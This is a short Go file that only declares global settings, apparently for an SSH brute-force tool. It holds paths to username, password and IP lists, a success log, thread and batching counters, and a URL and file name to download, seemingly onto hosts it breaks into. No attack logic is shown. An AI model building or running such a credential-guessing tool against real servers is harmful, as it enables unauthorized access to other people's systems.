package main

import (
	"sync"
)

var NWP string = "./data/user.txt"
var PWP string = "./data/password.txt"
var OUT string = "./out/success.txt"
var IPP string = "./data/ip.txt"
var DOWNLOAD string = "https://www.baidu.com/index"
var DOWNNAME string = "ma"
var LOGFILE string = "./out/ssh.log"
var TNUM int = 1
var userIndexMap map[string]int = make(map[string]int)
var passIndexMap map[string]int = make(map[string]int)
var ipIndex int = 0
var ipPage int = 0
var pageIpNum int = 50
var upNum int = 5
var ipWithNum map[string]int = make(map[string]int)
var userList []string
var pwdList []string
var ipList []string
var L1 sync.Mutex
var L2 sync.Mutex
var L3 sync.Mutex
var wg sync.WaitGroup
